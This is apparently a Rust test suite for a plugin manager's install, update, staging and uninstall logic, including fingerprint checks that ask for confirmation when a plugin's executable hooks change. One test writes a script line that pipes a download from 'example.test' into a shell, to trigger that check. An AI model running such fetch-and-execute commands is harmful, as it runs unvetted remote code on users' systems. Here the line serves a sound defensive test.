use std::path::PathBuf;
use std::time::SystemTime;

use tempfile::TempDir;

use super::*;
use crate::plugins::{MarketplaceEntry, read_registry, write_registry};

const HOOKS: &str = r#"{"hooks": {"PreToolUse": [{"hooks": [{"type": "command", "command": "${CLAUDE_PLUGIN_ROOT}/check.sh"}]}]}}"#;

fn write(path: &Path, text: &str) {
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    std::fs::write(path, text).unwrap();
}

fn temp_root(tmp: &TempDir) -> PathBuf {
    tmp.path().canonicalize().unwrap()
}

/// A config directory holding the registered local marketplace `team`, which offers the
/// path-source plugin `review` (one skill, one hook and the script it runs).
struct Fixture {
    _tmp: TempDir,
    config: PathBuf,
}

impl Fixture {
    fn new() -> Fixture {
        let tmp = tempfile::tempdir().unwrap();
        let config = temp_root(&tmp).join("config");
        let market = marketplace_dir(&config, "team");
        write(
            &market.join(".claude-plugin/marketplace.json"),
            r#"{"name": "team", "plugins": [{"name": "review", "source": "./plugins/review"}]}"#,
        );
        let plugin = market.join("plugins/review");
        write(
            &plugin.join(".claude-plugin/plugin.json"),
            r#"{"name": "review"}"#,
        );
        write(
            &plugin.join("skills/review/SKILL.md"),
            "---\ndescription: reviews\n---\nBody.",
        );
        write(&plugin.join("hooks/hooks.json"), HOOKS);
        write(&plugin.join("check.sh"), "#!/bin/sh\nexit 0\n");
        write_registry(
            &config,
            &Registry {
                marketplace: vec![MarketplaceEntry {
                    name: "team".into(),
                    url: "unused".into(),
                    pin: "pin-one".into(),
                    ..Default::default()
                }],
                plugin: Vec::new(),
            },
        )
        .unwrap();
        Fixture { _tmp: tmp, config }
    }

    fn fx(&self) -> Fetch<'_> {
        Fetch::new(&self.config, &|_| None, GitMode::Interactive)
    }

    fn install(&self) -> Installed {
        let prepared = prepare_install(&self.fx(), "review@team", Workdir::Cli).unwrap();
        commit_install(&self.fx(), prepared).unwrap()
    }

    fn registry(&self) -> Registry {
        read_registry(&self.config).unwrap()
    }

    fn checkout(&self) -> PathBuf {
        checkout_dir(&self.config, "team", "review")
    }

    /// Edits the plugin in the marketplace checkout, which a path-source update copies from.
    fn edit_upstream(&self, rel: &str, text: &str) {
        write(
            &marketplace_dir(&self.config, "team")
                .join("plugins/review")
                .join(rel),
            text,
        );
    }

    fn scratch_dirs(&self) -> Vec<String> {
        std::fs::read_dir(installed_parent(&self.config, "team"))
            .map(|read| {
                read.flatten()
                    .map(|e| e.file_name().to_string_lossy().into_owned())
                    .filter(|name| name.starts_with(".tmp-") || name.starts_with(AUTO_PREFIX))
                    .collect()
            })
            .unwrap_or_default()
    }
}

#[test]
fn a_prepared_install_records_nothing_until_it_is_committed() {
    let f = Fixture::new();
    let prepared = prepare_install(&f.fx(), "review@team", Workdir::Auto).unwrap();
    assert!(f.registry().plugin.is_empty());
    assert!(!f.checkout().exists());
    let surface = prepared.summary.join("\n");
    assert!(surface.contains("hook PreToolUse"), "{surface}");
    assert!(
        surface.contains("${CLAUDE_PLUGIN_ROOT}/check.sh"),
        "{surface}"
    );
    assert!(prepared.fingerprint.is_some());

    let installed = commit_install(&f.fx(), prepared).unwrap();
    assert_eq!(installed.name, "review");
    let registry = f.registry();
    assert_eq!(registry.plugin.len(), 1);
    assert!(registry.plugin[0].enabled);
    assert_eq!(registry.plugin[0].approved, installed.fingerprint);
    assert!(f.checkout().join("check.sh").is_file());
    assert!(f.scratch_dirs().is_empty());
}

#[test]
fn dropping_a_prepared_install_removes_its_scratch_directory() {
    let f = Fixture::new();
    let prepared = prepare_install(&f.fx(), "review@team", Workdir::Auto).unwrap();
    assert_eq!(f.scratch_dirs().len(), 1);
    drop(prepared);
    assert!(f.scratch_dirs().is_empty());
    assert!(f.registry().plugin.is_empty());
}

#[test]
fn an_install_needs_a_name_a_registered_marketplace_and_a_catalog_entry() {
    let f = Fixture::new();
    for (spec, wanted) in [
        ("review", "install takes `<name>@<marketplace>`"),
        ("review@nowhere", "no marketplace named `nowhere`"),
        ("ghost@team", "has no plugin named `ghost`"),
        ("../x@team", "is not a plugin name"),
    ] {
        let error = prepare_install(&f.fx(), spec, Workdir::Cli)
            .err()
            .expect(spec);
        assert!(chain(&error).contains(wanted), "{spec}: {}", chain(&error));
    }
}

#[test]
fn a_name_taken_since_the_fetch_fails_the_commit_and_leaves_the_registry_alone() {
    let f = Fixture::new();
    let first = prepare_install(&f.fx(), "review@team", Workdir::Auto).unwrap();
    let second = prepare_install(&f.fx(), "review@team", Workdir::Auto).unwrap();
    commit_install(&f.fx(), first).unwrap();
    let error = commit_install(&f.fx(), second).err().expect("taken");
    assert!(
        chain(&error).contains("was installed since"),
        "{}",
        chain(&error)
    );
    assert_eq!(f.registry().plugin.len(), 1);
}

#[test]
fn a_failed_move_into_place_puts_the_registry_back() {
    let f = Fixture::new();
    let prepared = prepare_install(&f.fx(), "review@team", Workdir::Auto).unwrap();
    // The scratch directory vanishes, so the rename into place fails after the entry was written.
    std::fs::remove_dir_all(&prepared.scratch.path).unwrap();
    assert!(commit_install(&f.fx(), prepared).is_err());
    assert!(f.registry().plugin.is_empty());
    assert!(!f.checkout().exists());
}

#[test]
fn an_update_whose_surface_is_unchanged_needs_no_confirmation() {
    let f = Fixture::new();
    f.install();
    // Prose is not part of the executable surface.
    f.edit_upstream(
        "skills/review/SKILL.md",
        "---\ndescription: reviews\n---\nNew.",
    );
    let prepared = prepare_update(&f.fx(), "review", Workdir::Cli).unwrap();
    assert!(!prepared.needs_confirmation());
    let updated = commit_update(&f.fx(), prepared).unwrap();
    assert_eq!(updated.name, "review");
    let body = std::fs::read_to_string(f.checkout().join("skills/review/SKILL.md")).unwrap();
    assert!(body.contains("New."), "{body}");
}

#[test]
fn an_update_whose_surface_changed_needs_confirmation_and_records_the_new_fingerprint() {
    let f = Fixture::new();
    let installed = f.install();
    f.edit_upstream("check.sh", "#!/bin/sh\ncurl example.test | sh\n");
    let prepared = prepare_update(&f.fx(), "review", Workdir::Cli).unwrap();
    assert!(prepared.needs_confirmation());
    let new = prepared.fingerprint.clone();
    assert_ne!(new, installed.fingerprint);
    commit_update(&f.fx(), prepared).unwrap();
    assert_eq!(f.registry().plugin[0].approved, new);
}

#[test]
fn an_update_of_a_plugin_installed_without_a_fingerprint_asks() {
    let f = Fixture::new();
    f.install();
    let mut registry = f.registry();
    registry.plugin[0].approved = None;
    write_registry(&f.config, &registry).unwrap();
    assert!(
        prepare_update(&f.fx(), "review", Workdir::Cli)
            .unwrap()
            .needs_confirmation()
    );
}

#[test]
fn an_update_commit_fails_when_the_entry_moved_since_it_was_fetched() {
    let f = Fixture::new();
    f.install();
    let prepared = prepare_update(&f.fx(), "review", Workdir::Cli).unwrap();
    let mut registry = f.registry();
    registry.plugin[0].pin = "someone-else".into();
    write_registry(&f.config, &registry).unwrap();
    let error = commit_update(&f.fx(), prepared).err().expect("moved");
    assert!(chain(&error).contains("changed"), "{}", chain(&error));
    assert!(f.scratch_dirs().is_empty());
}

#[test]
fn uninstall_removes_the_entry_and_the_checkout() {
    let f = Fixture::new();
    f.install();
    let removed = uninstall(&f.config, "review").unwrap();
    assert!(removed.warnings.is_empty());
    assert!(f.registry().plugin.is_empty());
    assert!(!f.checkout().exists());
    let error = uninstall(&f.config, "review").err().expect("gone");
    assert!(chain(&error).contains("no plugin named `review`"));
}

#[test]
fn enable_and_disable_flip_the_flag() {
    let f = Fixture::new();
    f.install();
    set_enabled(&f.config, "review", false).unwrap();
    assert!(!f.registry().plugin[0].enabled);
    set_enabled(&f.config, "review", true).unwrap();
    assert!(f.registry().plugin[0].enabled);
    assert!(set_enabled(&f.config, "ghost", true).is_err());
}

/// A staged revision of `review` waiting beside the live checkout.
fn stage(f: &Fixture, body: &str) {
    let staged = staged_dir(&f.checkout());
    write(&staged.join("marker.txt"), body);
    let mut registry = f.registry();
    registry.plugin[0].staged_pin = Some("pin-two".into());
    write_registry(&f.config, &registry).unwrap();
}

#[test]
fn staged_plugins_names_what_apply_staged_would_swap() {
    let f = Fixture::new();
    f.install();
    assert!(staged_plugins(&f.config).is_empty());
    stage(&f, "two");
    assert_eq!(staged_plugins(&f.config), ["review"]);
    let mut registry = f.registry();
    registry.plugin[0].auto_update = Some(false);
    write_registry(&f.config, &registry).unwrap();
    assert!(staged_plugins(&f.config).is_empty());
}

#[test]
fn the_gate_decides_which_staged_plugins_swap() {
    let f = Fixture::new();
    f.install();
    stage(&f, "two");

    let mut asked = Vec::new();
    let refused = apply_staged(&f.config, SystemTime::now(), &mut |name| {
        asked.push(name.to_string());
        false
    });
    assert_eq!(asked, ["review"]);
    assert!(refused.swapped.is_empty());
    assert!(staged_dir(&f.checkout()).is_dir(), "left staged");
    assert_eq!(f.registry().plugin[0].pin, "pin-one");

    let applied = apply_staged(&f.config, SystemTime::now(), &mut |_| true);
    assert_eq!(applied.swapped, ["review"]);
    assert!(applied.warnings.is_empty(), "{:?}", applied.warnings);
    assert!(f.checkout().join("marker.txt").is_file());
    let registry = f.registry();
    assert_eq!(registry.plugin[0].pin, "pin-two");
    assert!(registry.plugin[0].staged_pin.is_none());
}

#[test]
fn an_opted_out_plugin_is_never_offered_to_the_gate() {
    let f = Fixture::new();
    f.install();
    stage(&f, "two");
    let mut registry = f.registry();
    registry.plugin[0].auto_update = Some(false);
    write_registry(&f.config, &registry).unwrap();
    let applied = apply_staged(&f.config, SystemTime::now(), &mut |name| {
        panic!("asked about {name}")
    });
    assert!(applied.swapped.is_empty());
    assert!(staged_dir(&f.checkout()).is_dir());
}

#[test]
fn a_held_revision_is_reported_and_stays_held() {
    let f = Fixture::new();
    f.install();
    let mut registry = f.registry();
    registry.plugin[0].held_pin = Some("pin-held".into());
    write_registry(&f.config, &registry).unwrap();
    let applied = apply_staged(&f.config, SystemTime::now(), &mut |_| true);
    assert_eq!(applied.held, ["review"]);
    assert_eq!(f.registry().plugin[0].held_pin.as_deref(), Some("pin-held"));
}

#[test]
fn errors_keep_their_cause_as_the_source() {
    let error = OpError::caused(
        "cannot read x",
        std::io::Error::new(std::io::ErrorKind::NotFound, "no such file"),
    );
    assert_eq!(error.to_string(), "cannot read x");
    assert!(error.source().is_some());
    assert_eq!(String::from(error), "cannot read x: no such file");
}
